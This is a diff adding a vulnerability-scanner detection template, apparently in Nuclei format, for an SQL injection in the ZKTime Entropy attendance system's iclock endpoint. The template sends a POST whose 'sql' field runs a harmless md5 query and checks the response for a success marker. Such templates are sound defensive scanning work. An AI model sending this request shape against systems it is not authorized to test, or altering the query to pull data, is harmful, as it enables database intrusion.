@@ -1,0 +1,33 @@
+id: poc-yaml-zktecosz-ebiams-iclock-sqli
+info:
+  name: ZKTime Entropy Smart Attendance Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in ZKTime Entropy Smart Attendance Management System's iclock endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/iclock/ic1ock"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select md5({{t1}})
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "执行 SQL 语句"
+          - "执行 select md5"
+          - "成功"
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
